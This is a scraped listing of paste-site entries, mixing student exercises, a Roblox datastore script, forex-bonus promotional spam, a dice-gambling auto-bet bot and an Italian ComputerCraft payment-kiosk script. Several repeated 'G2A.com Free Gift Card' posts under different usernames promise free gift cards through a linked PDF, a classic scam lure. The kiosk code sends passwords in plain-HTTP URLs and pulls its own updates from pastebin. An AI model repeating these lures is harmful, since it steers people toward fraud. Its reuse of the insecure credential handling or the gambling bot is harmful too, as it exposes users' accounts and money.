var belance = 0;
var greatie = elderly;
var prefit = 0.00001;
var beast = prefit;
var winnerdinner = elderly;
var wednesday = 0;
var stroke = 0;
var broke = 0;
var elven = elderly;
 
function go(){
if (greatie!=belance){
belance = document.getElementById('pct_balance').value;
if (belance>elven){
    stroke = stroke+1;
    broke  = 0;
    wednesday = wednesday+1 ;
    elven = parseFloat(belance);
}
if (belance<elven) {
    stroke = 0;
    broke = broke+1;
    elven = parseFloat(belance);
}
if (stroke==2) {
    beast = beast*2
}
if (stroke==3) {
    beast = beast*2
}
if (stroke==4) {
    beast = prefit;
    wednesday = 0;
    stroke  = 0;
}
if ((wednesday>1)&&(broke==1)) {
    beast = prefit;
    wednesday = 0;
} 
if ((wednesday<2)&&(broke>=2)) {
    beast = prefit;
    wednesday = 0;
} 
if (belance>=14400)  {
    console.log(""winner winner chicken dinner"");
    return;
} 
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
setTimeout(() => go(), 1);
greatie = document.getElementById('pct_balance').value;
}

go();"
8d98Qg56,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sayid83,JavaScript,Sunday 2nd of June 2024 02:33:06 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
J08KLUQS,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,PetrikDev,JavaScript,Sunday 2nd of June 2024 02:08:05 PM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
5pUGRBFr,Use This,qsenko1,Lua,Sunday 2nd of June 2024 02:03:24 PM CDT,"local Players = game:GetService(""Players"")
local DataStoreService = game:GetService(""DataStoreService"")
local EffectsDatastore = DataStoreService:GetDataStore(""EffectsDatastore"")

game.Players.PlayerAdded:Connect(function(Player)	
	local EffectsFolder = Instance.new(""Folder"",Player)
	EffectsFolder.Name = ""EffectsFolder""
	local EquippedDeathSounds = Instance.new(""StringValue"",Player)
	EquippedDeathSounds.Name = ""EquippedDeathSounds""
	-- Bool
	local EffectsBool = Instance.new(""BoolValue"",EffectsFolder)
	EffectsBool.Name = ""EffectsBool""
	-- Hand Trails
	local White_Trail = Instance.new(""BoolValue"",EffectsFolder)
	White_Trail.Name = ""White Trail""

	local userId = Player.UserId
	local key = ""Player_""..userId

	local success, returnValue 
	success, returnValue = pcall(EffectsDatastore.GetAsync, EffectsDatastore, key)

	if success then
		if returnValue == nil then
			returnValue = {
				White_Trail = false,
				EquippedDeathSounds = """"
			}			
		end
		-- Safety Bool
		EffectsBool.Value = true
		-- Trails
		White_Trail.Value = if returnValue.White_Trail ~= nil then returnValue.White_Trail else false
		-- Equppables
		EquippedDeathSounds.Value = if returnValue.EquippedDeathSounds ~= nil then returnValue.EquippedDeathSounds else """"
	else
		Player:Kick(""There was an error with loading your Data! Roblox's Datastore might be down,try agen later or contact us trough our Group!"")
		print(Player.Name.. "" Has a Data loading ERROR!!"")
	end

end)

game.Players.PlayerRemoving:Connect(function(Player)
	if Player.EffectsFolder:FindFirstChild(""EffectsBool"").Value == true then
		local userId = Player.UserId
		local key = ""Player_""..userId
		-- Main Values
		local equippeddeathsounds = Player.EquippedDeathSounds.Value
		-- Hand Trails
		local white_trail = Player.EffectsFolder[""White Trail""].Value

		local DataTable = {
			EquippedDeathSounds = equippeddeathsounds,
			White_Trail = white_trail,
		}

		print(DataTable)

		local success,returnValue
		success,returnValue = pcall(EffectsDatastore.UpdateAsync, EffectsDatastore, key, function()
			return DataTable
		end)

		if success  then
			print(""Effects Data Saved!"")
		else
			print(""Data Saving ERROR!!"")
		end

	end
end)"
VxTJDLCu,How Can I Maximize My Profits with the Trex Globals Credit Bonus,reviewbrokers,PHP,Sunday 2nd of June 2024 01:59:54 PM CDT,"https://www.reviewbrokers.net/how-can-i-maximize-my-profits-with-the-trex-globals-credit-bonus/
 Table of Contents: Trex Globals
1. Understanding the Trex Globals Credit Bonus
2. How to Claim Your Credit Bonus
3. Exploring Trading Opportunities with the Credit Bonus
4. Important Considerations
5. Terms and Conditions
6. Conclusion
Understanding the Trex Globals Credit Bonus
The Trex Globals Credit Bonus is a straightforward yet powerful offer that grants you a 50% credit bonus on top of your deposit amount. Imagine depositing $100 and receiving an additional $50 bonus, instantly boosting your account balance to $150. This extra credit serves as a catalyst for expanding your trading volume and potentially increasing your profits.
How to Claim Your Credit Bonus

 	
Register a new account:
Begin your trading journey with Trex Globals by signing up for a new account. The registration process is quick and seamless, ensuring you can start trading in no time.
 	
Complete the verification:
Prioritize the security of your account by completing the verification process. This step ensures the safety of your funds and provides peace of mind as you engage in trading activities.
 	
Receive the Credit Bonus 50%:
Once your account is verified, the 50% credit bonus will be automatically credited to your account. There's no waiting period—your bonus is ready to be utilized immediately.

Exploring Trading Opportunities with the Credit Bonus
The versatility of the bonus extends across various financial instruments, including forex, commodities, indices, and cryptocurrencies. Whether you're interested in currency pairs, precious metals, or digital assets, the credit bonus empowers you to explore diverse trading opportunities and implement various strategies.
Important Considerations

 	
Limited time offer:
The Trex Globals Credit Bonus is available for a limited time, adding a sense of urgency to this enticing offer.
 	
Withdrawal conditions:
The bonus can be withdrawn only upon generating profits. In the event of losses, the bonus amount will be deducted from your account balance, incentivizing responsible trading practices.

Terms and Conditions
It's crucial to familiarize yourself with the terms and conditions associated with the credit bonus:

 	
General terms and conditions:
The bonus is subject to the overarching terms and conditions of Trex Globals, ensuring fairness and transparency.
 	
Trex Globals' prerogative:
Trex Globals reserves the right to modify or terminate the promotion at its discretion, emphasizing the importance of staying informed.

Conclusion
The Trex Globals Credit Bonus presents a compelling opportunity to enhance your trading journey. By augmenting your initial investment with a 50% credit bonus, Trex Globals enables you to expand your trading horizons and pursue greater profits. However, it's essential to approach this bonus with a clear understanding of its terms and conditions, ensuring a positive and rewarding trading experience.

Don't miss out on the chance to elevate your trading experience with the Trex Globals Credit Bonus. Sign up today and seize the benefits while they last!"
FcGGJziv,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,x3kiN,JavaScript,Sunday 2nd of June 2024 01:43:03 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
cxP97c8A,How to Participate in the Sniper Weekly Demo Contest – InstaForex,fxvnpro,PHP,Sunday 2nd of June 2024 01:38:36 PM CDT,"https://www.fxvnpro.com/how-to-participate-in-the-sniper-weekly-demo-contest-instaforex/
 How to Participate in the Sniper Weekly Demo Contest – InstaForex
The Sniper Weekly Demo Contest is a prestigious competition hosted by InstaForex, designed to test and reward the best trading strategies and skills. Participants have the chance to win cash prizes while showcasing their trading prowess. Here are the essential details:
Table of Contents : InstaForex

 	Contest Overview
 	Eligibility Criteria
 	Trading Conditions
 	Determining Results and Winners
 	Additional Information

Contest Overview

 	Contest Name: Sniper Weekly Demo Contest
 	Organizer: InstaForex
 	Duration: Held every week from Monday 00:00 to Friday 23:59:59 (terminal time)
 	Prize Pool: $2,000
 	Prize Distribution:

 	1st place: $700
 	2nd place: $500
 	3rd place: $400
 	4th place: $300
 	5th place: $100


 	Registration: Participants must register on the InstaForex website and open individual demo accounts for each weekly contest. Registration ends one hour before the contest starts.

Eligibility Criteria

 	Participation: Any owner of a trading account with InstaForex can participate in the contest.
 	Age Requirement: Only full-aged customers (over 18 years old) are eligible.
 	Registration Details: Participants must sign up on the InstaForex website and provide true data, including their full name and available email address.

Trading Conditions

 	Initial Deposit: $10,000 for all participants.
 	Leverage: 1:500 by default.
 	Trading Instruments: Major currency pairs and cross rates are the only available trading instruments.
 	Trade Volume: Minimal trade volume is 0.01 lot, and the maximum is 1 lot.
 	Stop-out Level: 10%.
 	Expert Advisors: Participants can use Expert Advisors and any trading strategies without restrictions.

Determining Results and Winners

 	Results Access: Equity of participants' accounts is available in free access on the company's website during the contest period.
 	Winner Selection: The winners are determined based on the equity of their accounts at the end of the contest period.
 	Prize Claims: Winners are required to open and verify their live trading accounts to receive their prizes.

Additional Information

 	Future Registration: Participants can register for the next weekly contest during the week preceding it. Registration finishes one hour before the contest starts.
 	Disqualification Rights: The Organizer reserves the right to decline registration of any participant without explanation or disqualify any participant during the contest or after it is over with an explanation.

By following these rules and guidelines, participants can effectively take part in the Sniper Weekly Demo Contest and stand a chance to win cash prizes. This contest offers a fantastic opportunity for traders to refine their skills and gain recognition in the trading community.

Read InstaForex Review"
CECQcz2r,zad 2,Nihonik,Python,Sunday 2nd of June 2024 01:33:36 PM CDT,"x = int(input(""podaj liczbe: ""))


while True:
    if (x >= 0):
        x = int(input(""podaj ujemną liczbe: ""))
    else:
        print(""ok"")
        break"
ss7hdbTF,Untitled,yasi04,Python,Sunday 2nd of June 2024 01:32:03 PM CDT,"def remove_none(data):
    new_data = []
    for i in range(len(data)):
        if data[i][0] is not None:
            new_data.append(data[i])
    return new_data


def remove_doubles_rows(data):
    new_data = []
    for i in data:
        new_data.append(i)
    for i in range(len(data) - 1):
        for j in range(i + 1, len(data)):
            if data[i] == data[j]:
                del new_data[j]
    return new_data


def remove_doubles_columns(data):
    for i in range(len(data)):
        data[i] = sorted(list(frozenset(data[i])))
    return data


def transport(data):
    for i in range(len(data)):
        data[i] = transport2(data[i])
    return data


def transport2(data):
    data[0] = ""("" + data[0].split(' ')[1] + "") "" + data[0].split(' ')[2]
    data[1] = f""{float(data[1]):.4f}""
    data[2] = data[2].split('[')[0]
    data[3] = data[3].split(' ')[0]
    return data


def transform(data):
    new_data = [[] for _ in range(len(data[0]))]
    for i in range(len(new_data)):
        for j in range(len(data)):
            new_data[i].append(data[j][i])
    new_data[0], new_data[1], new_data[2], new_data[3] = new_data[2], new_data[1], new_data[0], new_data[3]
    return new_data


def main(data):
    data = remove_none(data)
    data = remove_doubles_rows(data)
    data = remove_doubles_columns(data)
    data = transport(data)
    data = transform(data)
    return data
"
ZHXSbz10,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 01:29:12 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

int main()
{
  vector<pair<int, int>> v;

  int n;
  cin >> n;
  for(int i = 0; i < n; i++) {
    int a, b;
    cin >> a >> b;
    v.push_back(make_pair(b, a));
  }

  sort(v.begin(), v.end());
    int res = 1;
    int vreme = v[0].first;
    for(int i = 1; i < n; i++) {
        if(vreme <= v[i].second) {
            res++;
            vreme = v[i].first;
        }
    }
    cout << res << endl;


    return 0;
}
"
uR220kR1,zad 1,Nihonik,Python,Sunday 2nd of June 2024 01:27:31 PM CDT,"x = input(""podaj liczby odzielone spacją: "")

y= x.split("" "")

z = 0

for i in y:
	a = int(i)
	if a % 10 == 0:
		z +=1
print(""ilość podanych liczb"" + len(x))
print(""ilość liczb podzielnych przez 10"" + z)"
H5Qz1Lde,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,FeasModz514,JavaScript,Sunday 2nd of June 2024 01:18:01 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
7Th7ZVVN,Nebraska Pay Chiosco 1.19,lego11,Lua,Sunday 2nd of June 2024 01:04:50 PM CDT,"local maxw, maxh = term.getSize()

--IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end

local tColourLookup = {}
for n = 1,16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2^(n-1)
end

function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or
       type(endX) ~= ""number"" or type(endY) ~= ""number"" or
       (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end

    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)

    if nColour then
        term.setBackgroundColor(nColour)
    end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end

    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end

    for x = minX, maxX do
        for y = minY, maxY do
            drawPixelInternal(x, y)
        end
    end
end

function clear()
    sfondo(colors.lightBlue)
    term.clear()
    term.setCursorPos(1, 1)
end
 
function colore(sfumatura)
    term.setTextColour(sfumatura)
end

function sfondo(sfumaturaSfondo)
    term.setBackgroundColour(sfumaturaSfondo)
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.yellow)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.black)
    term.write(testo)
    sfondo(colors.lightBlue)
end

function update()
    term.setCursorPos(1, 21)
    shell.run(""pastebin get y1AP0iNY startup2"") -- Inserire paste di nPay
	if fs.exists(""startup2"") then
		shell.run(""rm startup"")
		shell.run(""mv startup2 startup"")
    end
    os.reboot()
end

function disconnetti()
    clear()
    text = ""ARRIVEDERCI!""
    colore(colors.white)
    term.setCursorPos((maxw - #text) / 2, math.floor(maxh / 2))
    term.write(text)
    colore(colors.black)
    text2 = ""Tra poco saråA0 possibile eseguire""
    text3 = ""una nuova operazione...""
    term.setCursorPos((maxw - #text2) / 2, math.floor(maxh / 2) + 2)
    print(text2)
    term.setCursorPos((maxw - #text3) / 2, math.floor(maxh / 2) + 3)
    print(text3)
    os.sleep(0.5)
    update()
end

function drawCard()
    drawFilledBox(6, 7, 24, 7, colors.blue)
    drawFilledBox(6, 15, 24, 15, colors.blue)
    drawFilledBox(5, 8, 25, 14, colors.blue)

    drawFilledBox(7, 9, 23, 9, colors.lightGray)
    drawFilledBox(7, 12, 23, 13, colors.black)
end

mag = peripheral.wrap(""bottom"")
bl = ""BN Credit""

sfondo(colors.lightBlue)
clear()

colore(colors.white)
print("" "")
print(""                      ___            "")
print(""              _ __   / _ \\__ _ _   _ "")
print(""             | '_ \\ / /_)/ _  | | | |"")
print(""             | | | / ___/ (_| | |_| |"")
print(""             |_| |_\\/    \\__,_|\\__, |"")
print(""                                |___/ "")

-- Bottoni login/registrati

drawFilledBox(14, 10, 38, 12, colors.white)
term.setCursorPos(23, 11)
colore(colors.black)
term.write(""Accedi"")

drawFilledBox(14, 15, 38, 17, colors.white)
term.setCursorPos(21, 16)
colore(colors.black)
term.write(""Sei nuovo?"")

while true do
    event, key, x, y = os.pullEvent(""mouse_click"")
    if event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 15 and y <= 17 then
        -- Registrazione nuovo utente
        clear()
        titolo(""Registrati a nPay"")
        term.setCursorPos(1, 3)
        print(""Inserisci un nome utente e una password sicura."")
        term.setCursorPos(1, 5)
        colore(colors.gray)
        print(""Premi ENTER per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

        -- Nome Utente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(14, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
			utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""NO"" then
                term.setCursorPos(14, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(14, 10)
                colore(colors.red)
                term.write(""Utente giåA0 esistente!"")
                sleep(2)
                term.setCursorPos(14, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(14, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(14, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1, 12)
        term.write(""Password:"")
        term.setCursorPos(11, 12)
        colore(colors.white)

        passAccettata = false
        conteggioErrori = 0
        while passAccettata == false do
            password1 = read(""#"")
            colore(colors.black)
            term.setCursorPos(1, 13)
            term.write(""Verifica:"")
            term.setCursorPos(11, 13)
            colore(colors.white)
            local password2 = read(""#"")
            if password1 == password2 then
                term.setCursorPos(11, 12)
                colore(colors.lime)
                term.write(""###############"")
                term.setCursorPos(11, 13)
                term.write(""###############"")
                colore(colors.white)
                passAccettata = true
            else
                colore(colors.red)
                term.setCursorPos(11, 12)
                term.write(""Le password non corrispondono!    "")
                term.setCursorPos(1, 13)
                colore(colors.white)
                term.write(""                               "")
                sleep(1.5)
                term.setCursorPos(11, 12)
                term.write(""                               "")
                term.setCursorPos(11, 12)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(14, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(1.5)
                    term.setCursorPos(14, 12)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(14, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        --crea l'account

        term.setCursorPos(1, 17)
        creaAccount = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password1 .. ""&utente="" .. utente .. ""&richiesta=crea&valore=0"").readAll()
        tabCreaAccount = textutils.unserialize(creaAccount)
        if tabCreaAccount.stato == ""OA"" then
            colore(colors.lime)
            print(""Conto creato con successo."")
            sleep(1.5)
            clear()
            os.reboot()
        else
            colore(colors.red)
            print(""Errore durante la creazione del conto."")
            sleep(1.5)
            clear()
            os.reboot()
        end

    elseif event == ""mouse_click"" and x >= 14 and x <= 38 and y >= 10 and y <= 12 then
        clear()
        titolo(""Accedi a nPay"")
        term.setCursorPos(1, 3)
        colore(colors.black)
        print(""Inserire i propri dati."")
        colore(colors.gray)
        print(""\nPremere Enter per confermare i dati inseriti.\nSe i dati sono corretti, il campo diventeråA0 verde.\nSe sono errati, il programma chiederåA0 di reinserirli nuovamente."")

        --nomeutente
        term.setCursorPos(1, 10)
        colore(colors.black)
        term.write(""Nome utente:"")
        term.setCursorPos(15, 10)
        colore(colors.white)
        utenteAccettato = false
        conteggioErrori = 0
        while utenteAccettato == false do
            utente = read()
            utente = string.gsub(utente, ""%s"", """")
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=no&richiesta=verifica&utente="" .. utente).readAll()
            tabcheckuser = textutils.unserialize(checkuser)
            if tabcheckuser.stato == ""OK"" then
                term.setCursorPos(15, 10)
                colore(colors.lime)
                term.write(utente)
                colore(colors.white)
                utenteAccettato = true
            else
                term.setCursorPos(15, 10)
                colore(colors.red)
                term.write(""Utente errato!          "")
                sleep(2)
                term.setCursorPos(15, 10)
                colore(colors.white)
                term.write(""                       "")
                term.setCursorPos(15, 10)
                conteggioErrori = conteggioErrori + 1
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 10)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 10)
                    colore(colors.white)
                    term.write(""                       "")
                    term.setCursorPos(15, 10)
                    clear()
                    os.reboot()
                end
            end
        end

        --password
        colore(colors.black)
        term.setCursorPos(1,12)
        term.write(""Password:"")
        term.setCursorPos(15, 12)
         
        conteggioErrori = 0
        passAccettata = false
        while passAccettata == false do
            colore(colors.white)
            password = read(""#"")
            password = string.gsub(password, ""%s"", """")
            colore(colors.black)
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth="" .. password .. ""&richiesta=addebito&valore=0&utente="".. utente).readAll()
            risposta = textutils.unserialize(checkuser)
            if risposta.stato == ""OK"" then
                term.setCursorPos(15, 12)
                colore(colors.lime)
                term.write(""##############               "")
                colore(colors.white)
                passAccettata = true
                else
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Password errata!            "")
                    conteggioErrori = conteggioErrori + 1
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                if conteggioErrori > 2 then
                    term.setCursorPos(15, 12)
                    colore(colors.red)
                    term.write(""Tre tentativi di immissione errati."")
                    sleep(2)
                    term.setCursorPos(15, 12)
                    term.write(""                               "")
                    term.setCursorPos(15, 12)
                    clear()
                    os.reboot()
                end
            end
        end

        conteggioErrori = 0
        -- Pagina in cui scegli le operazioni da fare

        while true do
            --Ricontrolla il saldo per gestire l'aggiornamento di piåB9 operazioni
            checkuser = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?auth=""..password..""&richiesta=addebito&valore=0&utente=""..utente).readAll()
            risposta = textutils.unserialize(checkuser)
            saldo = tonumber(risposta.saldo)
            --Disegna la finestra del pannello utente
            clear()
            titolo(""Pannello utente nPay"")
            term.setCursorPos(1, 3)
            term.write(""Benvenuto, "")
            colore(colors.white)
            term.write(utente)
            colore(colors.black)
            term.write(""!         Saldo: "")
            colore(colors.white)
            term.write(saldo)
            colore(colors.black)
            term.write("" IC"")
            print(""\n\nOperazioni disponibili:\n"")
            sfondo(colors.white)
            print("" Carica denaro su nPay  \n"")
            print("" Preleva denaro da nPay \n"")
            print("" Trasferisci denaro     \n"")
            print("" Estratto conto         \n"")
            colore(colors.red)
            print("" Disconnettiti da nPay  \n"")
            colore(colors.black)

            antitonto = os.startTimer(60)

            event, key, x, y = os.pullEventRaw()
            if event == ""mouse_click"" and y == 7 and x <= 24 then       --Pulsante carica denaro su nPay
                clear()
                titolo(""Caricamento denaro su nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakC = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Caricamento denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                clear()
                                titolo(""Caricamento denaro su nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilitåA0 su carta:  "" .. tabel.v .. "" IC"")
                                colore(colors.red)
                                term.setCursorPos(1, 14)
                                term.write(""ATTENZIONE:"")
                                colore(colors.black)
                                term.setCursorPos(1, 15)
                                term.write(""Eccezionalmente, grazie ai 600 voti di marzo,"")
								--term.write(""Per le operazioni inferiori a 50 000 IC,"")
                                term.setCursorPos(1, 16)
								print(""le operazioni saranno GRATUITE fino al 4 aprile!"")
                                --print(""si applica una commissione del 0.15%."")
                                --print(""Oltre 50 000 IC la commissione åA8 del 0.05%."")
                                term.setCursorPos(1, 5)
                                term.write(""Importo da caricare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
                                    term.setCursorPos(22, 5)
                                    term.write(""Importo errato!                    "")
                                    colore(colors.black)
                                    sleep(1.5)
                                    clear()
                                else
                                    if tonumber(credit) >= 50000 then
										--commissioni = tonumber(credit) * 0.005
										commissioni = tonumber(credit) * 0
                                    else
                                       --commissioni = tonumber(credit) * 0.015
									   commissioni = tonumber(credit) * 0
                                    end
									crediton = credit + commissioni
                                    if tonumber(tabel.v) >= crediton then
                                        tab = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore="" .. credit).readAll()
                                        tabella = textutils.unserialize(tab)
                                        tabr = {}
                                        tabr.t = tabel.t
                                        tabr.e = tabel.e
                                        tabr.p = tabel.p
                                        tabr.v = tonumber(tabel.v) - crediton
                                        ncr = textutils.serialize(tabr)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        drawCard()

                                        colore(colors.black)
                                        sfondo(colors.lightBlue)
                                        term.setCursorPos(29, 10)
                                        print(""RE-INSERIRE LA CARTA"")
                                        term.setCursorPos(29, 12)
                                        print(""NEL LETTORE IN BASSO"")

                                        mag.setInsertCardLight(true)
                                        mag.beginWrite(ncr, bl)
                                        za2, carta = os.pullEvent(""mag_write_done"")
                                        mag.setInsertCardLight(false)
                                        clear()
                                        titolo(""Caricamento denaro su nPay"")

                                        colore(colors.lime)
                                        term.setCursorPos(1, 3)
                                        print(""Operazione completata!"")
                                        colore(colors.black)
                                        term.setCursorPos(1, 5)
                                        print(""Denaro accreditato: "" .. credit .. "" IC"")
                                        print(""Commissioni:        "" .. commissioni .. "" IC"")
                                        term.setCursorPos(1, 8)
                                        print(""Saldo sul conto:    "" .. tabella.credito .. "" IC"")
                                        print(""Saldo sulla carta:  "" .. tabr.v .. "" IC"")
                                        sfondo(colors.white)
                                        term.setCursorPos(1, 12)
                                        term.write("" Torna alla pagina principale "")
                                        sfondo(colors.lightBlue)

                                        antiTonto2 = os.startTimer(15)
                                        while true do
                                            local event, arg1, arg2, arg3 = os.pullEventRaw()
                                            if event == ""mouse_click"" and arg3 == 12 and arg2 <= 30 or event == ""timer"" and arg1 == antiTonto2 then -- arg2 = x | arg3 = y
                                                finalBreakC = true
                                                break
                                            end
                                        end
                                        break
                                    else
                                        colore(colors.red)
                                        term.setCursorPos(22, 5)
                                        term.write(""Credito su carta insufficente."")
                                        colore(colors.black)
                                        sleep(1.5)
                                        clear()
                                    end
                                end
                            end
                            if finalBreakC then
                                break
                            end
                        end
                    end
                end

            elseif event == ""mouse_click"" and y == 9 and x <= 24 then  --Pulsante preleva denaro da nPay
                clear()
                titolo(""Prelievo denaro da nPay"")

                drawCard()

                sfondo(colors.lightBlue)
                colore(colors.black)
                term.setCursorPos(30, 8)
                print(""INSERIRE LA CARTA"")
                term.setCursorPos(29, 10)
                print(""NEL LETTORE IN BASSO"")
                drawFilledBox(34, 14, 42, 14, colors.white)
                term.setCursorPos(35, 14)
                term.write(""Annulla"")

                mag.setInsertCardLight(true)
                finalBreakP = false
                while true do
                    event, arg1, arg2, arg3 = os.pullEventRaw()
                    if event == ""mouse_click"" and arg3 == 14 and arg2 >= 34 and arg2 <= 42 then -- arg2 = x | arg3 = y
                        mag.setInsertCardLight(false)
                        clear()
                        term.setCursorPos(1,1)
                        break
                    elseif event == ""mag_swipe"" then
                        mag.setInsertCardLight(false)
                        sfondo(colors.lightBlue)
                        clear()
                        tabel = textutils.unserialize(arg1)
                        if tabel == """" or tabel == nil then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(30, 12)
                            colore(colors.black)
                            term.write(""Carta smagnetizzata!"")
                            os.sleep(3)
                            break
                        elseif tabel.t ~= ""cc"" or tabel.e ~= ""BN"" then
                            clear()
                            titolo(""Prelievo denaro da nPay"")

                            drawCard()

                            sfondo(colors.lightBlue)
                            term.setCursorPos(36, 10)
                            colore(colors.red)
                            term.write(""ERRORE!"")
                            term.setCursorPos(31, 12)
                            colore(colors.black)
                            term.write(""Carta non valida!"")
                            os.sleep(3)
                            break
                        else
                            while true do
                                tabr = {}
                                tabr.e = tabel.e
                                tabr.p = tabel.p
                                tabr.t = tabel.t
                                tab1 = http.get(""http://luanet.rgbcraft.com/servlets/nebraskapay.php?utente="" .. utente .. ""&auth="" .. password .. ""&richiesta=accredito&valore=0"").readAll()
                                tab3 = textutils.unserialize(tab1)
                                clear()
                                titolo(""Prelievo denaro da nPay"")
                                colore(colors.gray)
                                print(""\n\nDisponibilitåA0 su conto:  "" .. saldo .. "" IC"")
                                colore(colors.black)
                                term.setCursorPos(1, 5)
                                term.write(""Importo da ritirare: "")
                                colore(colors.white)
                                credito = tonumber(tabel.v)
                                credit = read()
                                if tonumber(credit) == """" or tonumber(credit) == nil or tonumber(credit) <= 0 then
                                    colore(colors.red)
